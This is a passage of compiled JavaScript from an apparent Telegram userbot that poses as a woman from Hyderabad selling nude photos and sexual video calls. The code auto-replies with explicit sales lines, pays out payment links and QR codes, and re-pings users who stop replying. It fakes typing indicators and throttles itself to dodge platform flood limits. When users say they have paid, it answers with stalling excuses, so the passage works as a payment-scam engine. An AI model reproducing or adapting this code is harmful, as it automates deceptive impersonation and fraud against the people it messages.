                                            yield pushToReplies(event, chatId, `Want more...?\n\nCall  Just **50₹**\nPics Just **25₹!!**\n**Full NUDE, With FACE!!\n\n${process.env.demolink}/${process.env.clientId}**`, (0, common_1.getClientFilePath)(`./pic.jpg`));
                                        }
                                        else {
                                            yield pushToReplies(event, chatId, [(0, messages_1.pickOneMsg)(messages_1.messages.PayMsgArray)]);
                                        }
                                    }
                                    else {
                                        yield (0, inhandlerUpdated_1.respond)(event, [Msg]);
                                    }
                                }
                            }
                            catch (error) {
                                (0, parseError_1.parseError)(error, "Failed to fetch old Msgs1");
                            }
                        }
                    }
                    setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                        try {
                            const userDetails = yield db.read(chatId);
                            if (userDetails.canReply !== 0) {
                                const msgs = yield event.client.getMessages(event.chatId, { limit: 2 });
                                const hasMyMsg = msgs.some(msg => msg.fromId !== null);
                                // console.log('rePing check:', userDetails.username, ":", userDetails.lastMsgTimeStamp + 315000, Date.now(), msgs[0]?.fromId)
                                if (msgs.length > 0 && (userDetails.totalCount < 4 || !hasMyMsg || (userDetails.lastMsgTimeStamp + 315000 < Date.now()))) { //&& msgs[0]?.fromId === null)) {
                                    if (!repingMap.has(chatId)) {
                                        repingMap.set(chatId, 0);
                                    }
                                    if (repingMap.get(chatId) < 4) {
                                        repingMap.set(chatId, repingMap.get(chatId) + 1);
                                        const Msg = (0, messages_1.pickOneMsg)(messages_1.randomMsg);
                                        if (Msg === 'qr') {
                                            yield pushToReplies(event, chatId, messages_1.messages.demo, (0, common_1.getClientFilePath)('./QR.jpg'));
                                        }
                                        else if (Msg === 'numb') {
                                            picMap.set(event.message.chatId.toString(), true);
                                            yield pushToReplies(event, chatId, `Want more...?\n\nCall  Just **50₹**\nPics Just **25₹!!**\n**Full NUDE, With FACE!!\n\n${process.env.demolink}/${process.env.clientId}**`, (0, common_1.getClientFilePath)(`./pic.jpg`));
                                        }
                                        else {
                                            yield (0, inhandlerUpdated_1.respond)(event, [Msg]);
                                        }
                                    }
                                }
                            }
                        }
                        catch (error) {
                            (0, parseError_1.parseError)(error, "Failed to fetch old Msgs2");
                        }
                    }), 320000);
                }
                catch (error) {
                    yield (0, utils_1.broadcast)('ERROR - GEN', JSON.stringify(error));
                    (0, parseError_1.parseError)(error);
                    const userDetail = yield db.read(chatId);
                    yield db.update(chatId, { limitTime: Math.max(userDetail.limitTime, Date.now() + 15000) });
                }
            }
        }
    });
}
function getMinWordCountString(str1, str2) {
    try {
        if (typeof str1 !== 'string') {
            return str2;
        }
        if (typeof str2 !== 'string') {
            return str1;
        }
        const words1 = str1.split(' ');
        const words2 = str2.split(' ');
        if (words1.length === 1 && words2.length > 1) {
            return str2;
        }
        else if (words2.length === 1 && words1.length > 1) {
            return str1;
        }
        if (words1.length > 2 && words2.length > 2) {
            return words1.length < words2.length ? str1 : str2;
        }
        else if (words1.length > 2) {
            return str1;
        }
        else if (words2.length > 2) {
            return str2;
        }
        else {
            return str1;
        }
    }
    catch (error) {
        (0, parseError_1.parseError)(error);
        return str2;
    }
}
function pushToReplies(event, chatId, msg, file, msgId, waitTime) {
    return __awaiter(this, void 0, void 0, function* () {
        yield checkReplierHealth();
        try {
            const userDetail = yield db.read(chatId);
            if (msg !== '' || file !== undefined || file !== '') {
                if (userDetail.totalCount > 3 && !file) {
                    const index = repliesArr.findIndex(obj => (obj.chatId === chatId && !obj.file));
                    if (index === -1) {
                        repliesArr.push({ event: event, chatId: chatId, msg: msg, file: file, msgId: undefined, waitTime: waitTime, pushedAt: Date.now() });
                    }
                    else {
                        if (msg && msg !== '' && repliesArr[index].msg && repliesArr[index].msg !== '') {
                            repliesArr[index].msg = getMinWordCountString(msg, repliesArr[index].msg);
                        }
                    }
                }
                else {
                    repliesArr.push({ event: event, chatId: chatId, msg: msg, file: file, msgId: undefined, waitTime: waitTime, pushedAt: Date.now() });
                }
            }
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    });
}
let lastChecked = Date.now();
function checkReplierHealth() {
    return __awaiter(this, void 0, void 0, function* () {
        replier();
        if (repliesArr.length > 10 && Date.now() > lastChecked + 2 * 60 * 1000) {
            lastChecked = Date.now();
            const msg = `\n\n1 Min: ${minuteQueue.length}\n10 Mins: ${tenMinutesQueue.length}\n1 hour: ${hourQueue.length}\n\nPending: ${repliesArr.length}`;
            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${(process.env.clientId).toUpperCase()}:Replier Stuck\n\nReplierLen:${repliesArr.length}\nglobalCanReply:${index_1.globalCanReply}\nGlobalSleepTime:${Date.now() > globalSleepTime}\nSleepTime:${sleepTime < Date.now()}\n${msg}`)}`);
            const isLimitNotExceeded = IsAllRateLimitExceeded(false);
            if (isLimitNotExceeded) {
                replier(true);
            }
        }
        if (repliesArr.length > 20) {
            // await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`${(process.env.clientId).toUpperCase()}:Exitting as unable to recover Replier HEalth!!`)}`);
            //process.exit(1);
        }
    });
}
function localMsgStats() {
    return {
        minuteQueue,
        tenMinutesQueue,
        hourQueue
    };
}
const messagesPerMinute = 6;
const messagesPer10Minutes = 40;
const messagesPerHour = 150;
const minuteWindowDuration = 60 * 1000;
const tenMinutesWindowDuration = 10 * 60 * 1000;
const hourWindowDuration = 60 * 60 * 1000;
const minuteQueue = [];
const tenMinutesQueue = [];
const hourQueue = [];
const TIMEOUT = 5000;
let lastReplied = Date.now();
let lastProcessed = Date.now();
function isRateLimitExceeded(windowQueue, windowDuration, maxMessages) {
    const now = Date.now();
    while (windowQueue.length > 0 && now - windowQueue[0] >= windowDuration) {
        windowQueue.shift();
    }
    return windowQueue.length >= maxMessages;
}
function IsAllRateLimitExceeded(isMsgLimitReached) {
    const maxPerMin = isMsgLimitReached ? messagesPerMinute - 2 : messagesPerMinute;
    const maxPer10Min = isMsgLimitReached ? messagesPer10Minutes - 10 : messagesPer10Minutes;
    return (!isRateLimitExceeded(minuteQueue, minuteWindowDuration, maxPerMin) &&
        !isRateLimitExceeded(tenMinutesQueue, tenMinutesWindowDuration, maxPer10Min) &&
        !isRateLimitExceeded(hourQueue, hourWindowDuration, messagesPerHour));
}
let isReplierRunning = false;
function replier(force) {
    return __awaiter(this, void 0, void 0, function* () {
        if (repliesArr.length > 0 && (!isReplierRunning || force || lastReplied < Date.now() - 30000)) {
            isReplierRunning = true;
            try {
                const client = index_1.tgClass.getClient();
                yield processReplies(client);
            }
            catch (error) {
                console.log("Error in Replier");
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${(process.env.clientId).toUpperCase()}: Error in Replier`)}`);
            }
            finally {
                isReplierRunning = false;
            }
        }
    });
}
function processReplies(client) {
    return __awaiter(this, void 0, void 0, function* () {
        while (lastProcessed < (Date.now() - 3000) && repliesArr.length > 0) {
            if (index_1.globalCanReply && Date.now() > globalSleepTime) {
                const replyObj = repliesArr.shift();
                try {
                    const msgStats = (0, utils_1.getPeriodicMsgStats)();
                    const isMsgLimitReached = (msgStats.totalCount > 3200 || msgStats.userCount > 300);
                    const isLimitNotExceeded = IsAllRateLimitExceeded(isMsgLimitReached);
                    if (isLimitNotExceeded) {
                        if (replyObj) {
                            yield (0, withTimeout_1.withTimeout)(processSingleReply(client, replyObj, isMsgLimitReached), 15000, `ProcessSingleReply Timeout: ${replyObj.chatId}`);
                        }
                        else {
                            yield (0, Helpers_1.sleep)(2000);
                        }
                    }
                    else {
                        yield (0, withTimeout_1.withTimeout)(handleTyping(client, replyObj), 5000, "SetTyping Timeout");
                        repliesArr.unshift(replyObj);
                        yield (0, Helpers_1.sleep)(20000);
                    }
                }
                catch (error) {
                    const errorDetails = (0, parseError_1.parseError)(error, undefined, false);
                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${(process.env.clientId).toUpperCase()}::${errorDetails.message}`)}`);
                    yield index_1.tgClass.connect();
                    repliesArr.unshift(replyObj);
                    yield (0, Helpers_1.sleep)(5000);
                }
            }
            else {
                for (const obj of repliesArr) {
                    yield (0, withTimeout_1.withTimeout)(handleTyping(client, obj), 5000, "SetTyping Timeout");
                    yield (0, Helpers_1.sleep)(1000);
                }
                yield (0, Helpers_1.sleep)(20000);
            }
        }
    });
}
function processSingleReply(client, replyObj, isMsgLimitReached) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            lastProcessed = Date.now();
            const event = replyObj.event;
            const entity = yield fetchSender(event);
            const userDetail = yield db.read(replyObj.chatId);
            const msgs = (yield (0, withTimeout_1.withTimeout)(client.getMessages(entity, { limit: 4 }), 5000, "GetMessages Timeout", false)) || [{ fromId: null }];
            const hasOthersMsg = msgs.some(msg => msg.fromId == null);
            if (replyObj.pushedAt > Date.now() - (5 * 60 * 1000)) {
                if (userDetail && msgs.length > 0 && (hasOthersMsg || msgs['total'] < 10)) {
                    yield handleReply(client, replyObj, userDetail, entity, isMsgLimitReached);
                }
                else {
                    setTimeout(() => {
                        repliesArr.push(replyObj);
                    }, 10000);
                }
            }
            else {
                yield updateUserDetail(replyObj, entity, msgs);
            }
        }
        catch (error) {
            repliesArr.unshift(replyObj);
            const errorDetails = (0, parseError_1.parseError)(error);
            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${(process.env.clientId).toUpperCase()}\n\nError in Replier: ${errorDetails.message}`)}`);
        }
    });
}
function handleTyping(client, obj) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const event = obj.event;
            const entity = yield fetchSender(event);
            yield (0, withTimeout_1.withTimeout)(client.invoke(new telegram_1.Api.messages.SetTyping({
                peer: entity,
                action: new telegram_1.Api.SendMessageRecordVideoAction(),
            })), 5000, "Typing timeout");
        }
        catch (error) {
            console.log(error);
        }
    });
}
function handleReply(client, replyObj, userDetail, entity, isMsgLimitReached) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            if (userDetail.limitTime < Date.now() && userDetail.canReply && sleepTime < Date.now()) {
                yield markAsRead(client, entity);
                yield setTypingWithWaitTime(client, entity, replyObj.waitTime, isMsgLimitReached);
                yield sendReply(client, replyObj, userDetail, entity);
            }
            else {
                console.log('SKIPPED REPLY!!', replyObj.msg);
            }
        }
        catch (error) {
            console.log(error.errorMessage, replyObj);
            handleFloodErrors(error);
        }
    });
}
function markAsRead(client, entity) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            yield (0, withTimeout_1.withTimeout)(client.markAsRead(entity), 5000, "Mark as Timeout");
        }
        catch (error) {
            console.log('Cannot mark as read');
        }
    });
}
function setTypingWithWaitTime(client, entity, waitTime, isMsgLimitReached) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            yield (0, withTimeout_1.withTimeout)(client.invoke(new telegram_1.Api.messages.SetTyping({
                peer: entity,
                action: new telegram_1.Api.SendMessageTypingAction(),
            })), 5000, "SetTyping Timeout");
            if (waitTime !== undefined) {
                yield (0, Helpers_1.sleep)(waitTime);
            }
            yield (0, Helpers_1.sleep)(2000 + (isMsgLimitReached ? 3000 : 0));
        }
        catch (error) {
            console.log('Cannot set typing');
        }
    });
}
function sendReply(client, replyObj, userDetail, entity) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            if (replyObj.file !== undefined || (replyObj.msg && replyObj.msg !== '')) {
                if (replyObj.file === undefined) {
                    yield (0, withTimeout_1.withTimeout)(replyObj.event.message.respond({ message: replyObj.msg }), 5000, "Respond Timeout");
                }
                else {
                    yield sendFile(client, replyObj, entity, userDetail);
                }
            }
            updateQueues();
        }
        catch (error) {
            console.log(error);
        }
    });
}
function sendFile(client, replyObj, entity, userDetail) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            if (userDetail.totalCount > 3 || replyObj.file.includes('intro') || replyObj.file.includes('QR')) {
                if (replyObj.file.endsWith('mp3')) {
                    yield (0, withTimeout_1.withTimeout)(client.sendFile(entity, { caption: replyObj.msg, file: replyObj.file, voiceNote: true, replyTo: replyObj.msgId }), 10000, "MP3 Timeout");
                }
                else if (replyObj.file.endsWith('jpg')) {
                    yield (0, withTimeout_1.withTimeout)(client.sendFile(entity, { caption: replyObj.msg, file: replyObj.file, replyTo: replyObj.msgId }), 10000, "JPG Timeout");
                }
            }
        }
        catch (error) {
            console.log('Cannot send file');
        }
    });
}
function updateUserDetail(replyObj, entity, msgs) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            // await db.updateSingleKey(replyObj.chatId, user.limitTime, Date.now() + (60 * 1000));
            const entityJson = entity.toJSON();
            console.log(`Ignored reply suspective - ${(entityJson === null || entityJson === void 0 ? void 0 : entityJson.username) ? `@${entityJson.username}` : entityJson.firstName} | ${msgs['total']} | ${msgs.length} | "${replyObj.file}" | "${replyObj.msg}"`);
        }
        catch (error) {
            console.log(error);
        }
    });
}
function fetchSender(event) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            return yield event.message.getSender();
        }
        catch (error) {
            console.log('Cannot fetch sender');
        }
    });
}
function handleFloodErrors(error) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a;
        if (error.code == 'ENOENT') {
            const cl = yield cloudinaryService_1.default.getInstance();
        }
        if (error instanceof errors_1.FloodWaitError) {
            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId.toUpperCase()}: FLOOD_WAIT_ERROR: ${error.seconds} Seconds`)}`);
            sleepTime = Date.now() + (1010 * error.seconds);
        }
        if (error instanceof errors_1.FloodError || ((_a = error === null || error === void 0 ? void 0 : error.message) === null || _a === void 0 ? void 0 : _a.includes('PEER_FLOOD')) || JSON.stringify(error).includes('PEER_FLOOD')) {
            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId.toUpperCase()}: PEER_FLOOD`)}`);
            (0, sendGreetings_1.setPeerFloodSleep)(5 * 60 * 1000);
            globalSleepTime = Date.now() + 180000;
        }
    });
}
function updateQueues() {
    lastReplied = Date.now();
    minuteQueue.push(Date.now());
    tenMinutesQueue.push(Date.now());
    hourQueue.push(Date.now());
}
function getReplierState() {
    return __awaiter(this, void 0, void 0, function* () {
        const msgStats = (0, utils_1.getPeriodicMsgStats)();
        const isMsgLimitReached = (msgStats.totalCount > 3200 || msgStats.userCount > 300);
        const isLimitNotExceeded = IsAllRateLimitExceeded(isMsgLimitReached);
        const msg = `globalReply: ${index_1.globalCanReply}\nlimitExceeded: ${!isLimitNotExceeded}\n\n1 Min: ${minuteQueue.length}\n10 Mins: ${tenMinutesQueue.length}\n1 hour: ${hourQueue.length}\n\nPending: ${repliesArr.length}`;
        yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)(process.env.accountsChannel)}&text=${encodeURIComponent(`${(process.env.username).toUpperCase()}:\nMessage Limit Exceeded!!\n\n${msg}`)}`);
    });
}
function sendSelfDestructImage(client, image, msg, user) {
    return __awaiter(this, void 0, void 0, function* () {
        const file = yield client.uploadFile({
            file: new uploads_1.CustomFile('pic.jpg', fs_1.default.statSync(image).size, image),
            workers: 1,
        });
        const parsedObj = yield (0, messageParse_1._parseMessageText)(client, msg, 'html');
        const result = yield client.invoke(new telegram_1.Api.messages.SendMedia({
            peer: user,
            media: new telegram_1.Api.InputMediaUploadedPhoto({
                file: file,
                ttlSeconds: 20,
            }),
            message: parsedObj[0],
            entities: parsedObj[1],
            randomId: (0, big_integer_1.default)((0, index_1.generateRandomInt)())
        }));
    });
}
;
function sendTpMsg(event) {
    return __awaiter(this, void 0, void 0, function* () {
        if (!tpMap.has(event.message.chatId.toString())) {
            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                tpMap.set(event.message.chatId.toString(), true);
                yield (0, inhandlerUpdated_1.respond)(event, [`${(0, messages_1.pickOneMsg)(['**Are you Timepasser??**', '**I Think you are TimePasser!!**'])}\n\nPay Minimum **20₹** to Believe that you are **Not Timpasser**!!\n\nI will Give service Immediately if you Prove yourself as Not Timpasser!!\n\n**If Not, Just STOP Msging!! U will NOT Get Anything Free Here!!**😏😏`]);
                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                    yield (0, inhandlerUpdated_1.respond)(event, ['I have already sent you my pic and voice!!\n\n**Now its ur time Dear!!**\n\nDont TimePass **just try Demo!!**\nI will make your Dick Hardest, Just try Once😘😘\n\n' + (0, messages_1.pickOneMsg)(messages_1.messages.PayMsgArray)]);
                }), 30000);
            }), 15000);
        }
    });
}
function getMsgStats() {
    return `\n1 Min: ${minuteQueue.length} \n10 Mins: ${tenMinutesQueue.length} \n1 hour: ${hourQueue.length}\n\nPending: ${repliesArr.length}`;
}


/***/ }),

/***/ "./src/respondToPaidMessages.ts":
/*!**************************************!*\
  !*** ./src/respondToPaidMessages.ts ***!
  \**************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.respondToPaidMsgs = respondToPaidMsgs;
const dbservice_1 = __webpack_require__(/*! ./dbservice */ "./src/dbservice.ts");
const inhandlerUpdated_1 = __webpack_require__(/*! ./inhandlerUpdated */ "./src/inhandlerUpdated.ts");
const messages_1 = __webpack_require__(/*! ./messages */ "./src/messages.ts");
const respondToMsgs_1 = __webpack_require__(/*! ./respondToMsgs */ "./src/respondToMsgs.ts");
const utils_1 = __webpack_require__(/*! ./utils */ "./src/utils.ts");
const withTimeout_1 = __webpack_require__(/*! ./utils/withTimeout */ "./src/utils/withTimeout.ts");
const parseError_1 = __webpack_require__(/*! ./utils/parseError */ "./src/utils/parseError.ts");
const common_1 = __webpack_require__(/*! ./common */ "./src/common.ts");
const paymentDoneRegex = new RegExp(`(\\b((pay(ment|mnt)|amount|amnt|amt|pais(a|e)|pay|money|mny|trans(action|actn)|(already|alrdy))\\b.*?\\b(sent|(done|dn|over|ovr)|(paid)|(complete|cmplt|completed)|(bhej(a|di(|ya|ye))|k(ar|r)d(iye|iya|iya|idya)|hog(aya|aye|ya))))\\b)|
    `, 'i');
const paymentDoneRevRegex = new RegExp(`(\\b(sent|(done|dn|over|ovr)|(paid)|(complete|cmplt|completed)|(bhej(a|di(|ya|ye))|k(ar|r)d(iye|iya|iya|idya)|hog(aya|aye|ya)))\\b.*?\\b(pay(ment|mnt)|amount|amnt|amt|pais(a|e)|pay|money|mny|trans(action|actn)|(already|alrdy))\\b)`, 'i');
function respondToPaidMsgs(event, allMsg) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a, _b, _c;
        const db = dbservice_1.UserDataDtoCrud.getInstance();
        const text = allMsg.toLowerCase();
        const chatId = (_a = event === null || event === void 0 ? void 0 : event.chatId) === null || _a === void 0 ? void 0 : _a.toString();
        const userDetails = yield db.read(chatId);
        const totalMsgs = userDetails.totalCount;
        const senderJson = yield (0, utils_1.getSenderJson)(event);
        const broadcastName = senderJson.username ? senderJson.username : senderJson.firstName;
        if ((0, inhandlerUpdated_1.contains)(text, ['bitch', 'lanj', 'rand', 'get lost', 'go away', 'no need', 'leave', 'not intres', 'no intres', 'no money'])) {
            yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.bye]);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['durat', 'minut', " der ", 'mins', 'mint', 'tim'])) {
            const money = (0, utils_1.extractNumberFromString)(text);
            if (money > 0) {
                if (money < 50) {
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: messages_1.messages.time }));
                }
                else if (money <= 150) {
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: (0, messages_1.pickOneMsg)(["5+ Mins!!", "5-6 Mins", "Dont Worry abt Time baby!!,\n\nI will make u Cumm and Release for Sure😚😚\nYour Dick will be Satisfied!!♥️🙈"]) }));
                }
                else {
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: (0, messages_1.pickOneMsg)(["30+ Mins!!", "Dont Worry abt Time baby!!,\n\nI will make u Cumm and Release for Sure😚😚\nYour Dick will be Satisfied!!♥️🙈"]) }));
                }
            }
            else {
                if (!userDetails.demoGiven) {
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: (0, messages_1.pickOneMsg)([messages_1.messages.time]) }));
                }
                else if (userDetails.demoGiven && !userDetails.secondShow) {
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: (0, messages_1.pickOneMsg)(["5+ Mins!!", "5-6 Mins", "Dont Worry abt Time baby!!,\n\nI will make u Cumm and Release for Sure😚😚\nYour Dick will be Satisfied!!♥️🙈"]) }));
                }
                else if (userDetails.demoGiven && userDetails.secondShow) {
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: (0, messages_1.pickOneMsg)(["30+ Mins!!", "Dont Worry abt Time baby!!,\n\nI will make u Cumm and Release for Sure😚😚\nYour Dick will be Satisfied!!♥️🙈"]) }));
                }
                else {
                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: "I will make u Cumm and Release for Sure😚😚\nYour Dick will be Satisfied!!♥️🙈" }));
                }
            }
        }
        else if (((0, inhandlerUpdated_1.contains)(text, ['10 ', '15 ', '5 ', '10m', '15m', '5m', 'ten']) && (0, inhandlerUpdated_1.contains)(text, ['durat', 'minut', 'mins', 'mint']))) {
            yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)(["250Rs", "Pay 250rs", "250rs ok??\n\nFull Show until u Release!!"])]);
        }
        else if (/^\d/.test(text)) {
            yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)([messages_1.messages.number, 'Haa fine!!\nPay and send Screenshot', "Hmm Done baby!\nPay and msg"])], true);
        }
        else if (((0, inhandlerUpdated_1.contains)(text, ['secur', 'room', 'ext']) && (0, inhandlerUpdated_1.contains)(text, ['charg', 'pric', 'cost']))) {
            yield (0, inhandlerUpdated_1.respond)(event, ["No Other Charges at all!!"]);
        }
        else if (((0, inhandlerUpdated_1.contains)(text, ['kya', 'what', 'em ']) && (0, inhandlerUpdated_1.contains)(text, ['chup', 'show', 'dhik']))) {
            yield (0, inhandlerUpdated_1.respond)(event, ["Everything!! I will show!!"]);
        }
        else if (text === '') {
            yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)(['?', 'What?', '??', '......?', 'Pay first!!'])]);
        }
        else if (((0, inhandlerUpdated_1.contains)(text, ['many']) && ((0, inhandlerUpdated_1.contains)(text, ['hw', 'how'])))) {
            yield (0, inhandlerUpdated_1.respond)(event, ["Demo 4 Pics\n\n30 Full Nude Pics: **200₹/-**"]);
        }
        else if (text === ("hi") || (0, inhandlerUpdated_1.startswith)(text, ['hello', 'hii', 'hai', 'hlw', 'hlo', 'hi ', 'hyy', 'hey'])) {
            const array = ['Hello', 'Hii', 'Hai', 'Hlo', 'Hi', 'Hyy', 'Hey'];
            const randomElement = array[Math.floor(Math.random() * array.length)];
            yield (0, inhandlerUpdated_1.respond)(event, [`${randomElement} **${senderJson.firstName}...**!!`], true);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, [' age', ' old']) || (text.startsWith("age"))) {
            yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.age], true);
        }
        else if (((0, inhandlerUpdated_1.contains)(text, ['send pic', 'normal', 'photo', 'see ', 'samp', 'full pic']))) {
            yield (0, inhandlerUpdated_1.respond)(event, [(0, messages_1.pickOneMsg)([messages_1.messages.nmns, "Demo 4 Pics 25₹/-\n\n30 Full Nude Pics: **200₹/-**", "Pay 25Rs"])]);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['wait', 'ruko', 'aagu']) || (0, inhandlerUpdated_1.isEqual)(text, ['ok', 'okay', 'kk', 'k'])) {
            yield (0, inhandlerUpdated_1.respond)(event, ["okay!!"]);
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['hyderabad', 'hyd'])) {
            yield (0, inhandlerUpdated_1.respond)(event, ["LB Nagar"], true);
        }
        else if (((0, inhandlerUpdated_1.contains)(text, ['u ', 'you']) && (0, inhandlerUpdated_1.contains)(text, ['from', 'frm', 'liv'])) ||
            (0, inhandlerUpdated_1.contains)(text, ['kha se', 'kaha se']) || (0, inhandlerUpdated_1.contains)(text, ['locat', 'plac'])) {
            yield (0, inhandlerUpdated_1.respond)(event, ["Hyderabad!!"], true);
        }
        else if ((paymentDoneRegex.test(text) || paymentDoneRevRegex.test(text) || (0, inhandlerUpdated_1.contains)(text, ['i paid', 'reply', 'please', 'pls']) || (0, inhandlerUpdated_1.isEqual)(text, ['paid', 'done'])) && !(0, inhandlerUpdated_1.contains)(text, ['dont', 'will', 'not', 'nahi', 'no ', "don't", '?', 'girl', 'wali', 'failed', 'issue', 'network', 'pending', 'process'])) {
            const paidCount = (yield db.getSingleKey(chatId, dbservice_1.user.paidCount)) + 1;
            yield db.updateSingleKey(chatId, dbservice_1.user.paidCount, paidCount);
            try {
                yield event.message.forwardTo(process.env.updatesChannel);
                yield event.message.forwardTo('me');
            }
            catch (error) {
                console.log('cannot forward');
            }
            if (paidCount == 2) {
                yield (0, inhandlerUpdated_1.respond)(event, ["I'm giving OFFLINE Romance service to other BOY Now!!\nI will message you when I'm back to Online!\n\n**Really Sorry for Delay!!**"]);
                //await respond(event, ['**Please Wait 15 Mins.**\n\nI just **Came Outside** for Food, I will Call you once I go back to home!!\n\n**Really Sorry!!**\n\nDont Worry I will Give you Service Pakka!']);
                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                    yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.aut + "\nDont be Angry for Delay....!!\nI will give you service PAkka!!\n\nI will message you when I'm come back to Online!!"]);
                }), 120000);
                const limitTime = yield db.getSingleKey(chatId, dbservice_1.user.limitTime);
                yield db.updateSingleKey(chatId, dbservice_1.user.limitTime, Math.max((Date.now() + (10 * 60 * 1000)), limitTime));
            }
            else if (paidCount === undefined || paidCount < 1) {
                yield (0, inhandlerUpdated_1.respond)(event, ['??']);
                if (paidCount === 0) {
                    setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                        yield (0, inhandlerUpdated_1.respond)(event, [`${messages_1.messages.channelLinks}`]);
                    }), 40000);
                }
            }
            else if (paidCount == 1) {
                yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.wait]);
            }
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['google pay', 'g pay', 'gpay', 'phn p', 'link', 'number', 'namb', 'detai', 'phone pay', 'network', 'paytm', 'phone pe', 'phonepe'])
            || ((0, inhandlerUpdated_1.contains)(text, ['how', 'where', 'hw', 'whr']) &&
                ((0, inhandlerUpdated_1.contains)(text, ['pay', 'send', 'money']) && !(0, inhandlerUpdated_1.contains)(text, ['much', 'cost', 'rate', 'amount', 'paise', 'price', "servi", 'kitn', 'charge'])))) {
            yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: '<b>PAY to Payment Links👇👇</b>\n\n' + messages_1.messages.pynw + `\n\n<b>Pay now</b> and send me <b>Screenshot!!</b>\nI will do <b>VideoCall</b> Now <b>itself!!</b>` + '\n\n<b>' + `Website 👉🏻 ${process.env.link}` + '</b>', parseMode: 'html', linkPreview: false }));
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['scan', 'scanner', 'qr', 'barcode'])) {
            yield (0, respondToMsgs_1.pushToReplies)(event, chatId, `${messages_1.messages.qr}\n\n${messages_1.messages.link}`, (0, common_1.getClientFilePath)('./QR.jpg'));
        }
        else if ((0, inhandlerUpdated_1.contains)(text, ['google pay', 'g pay', 'gpay'])) {
            yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `Open 👉🏻 ${messages_1.payLinks.gpay1}`, parseMode: 'html', linkPreview: false }));
            yield event.client.sendMessage('@miscmessages', { message: broadcastName + ": " + text });
        }
        else if (event.message.chatId.toString() !== '5249581831' && !((_c = (_b = event.message.media) === null || _b === void 0 ? void 0 : _b.className) === null || _c === void 0 ? void 0 : _c.includes('Media')) &&
            ((((0, inhandlerUpdated_1.contains)(text, ['cant', "can't", 'avvatledhu', 'cannot', 'prob', 'nahi', 'nai', 'nhi']) && (0, inhandlerUpdated_1.contains)(text, ['pay', 'send mon', 'send pay', 'pais', 'sending mon', 'sending pay', 'going', 'sent mon', 'sent pay']) && !(0, inhandlerUpdated_1.contains)(text, ['demo', 'trust', 'call', 'free'])) ||
                (0, inhandlerUpdated_1.contains)(text, ['decli', 'avvatledhu', 'fail', 'not able', 'issue', 'not hap', 'unable', ' nai hor', 'nai ja', 'nhi hor', 'nhi ja', 'nahi hor', 'nahi ja', 'process', 'no phon', 'no payt',
                    'server', 'not open', 'error', 'work nh', 'work nah', 'not work', 'doesnot wor', 'doesnot wor', "doesn't wo", 'work no'])) && !((0, inhandlerUpdated_1.contains)(text, ["paid ", 'trust', 'confirm', 'demo', "successful", "connect", 'call', 'paise nahi h', 'paise nhi h', 'paisa nahi h', 'paisa nhi h', 'transaction successful', 'switch', "on paytm", 'share transaction', 'completed', 'pay again'])))) {
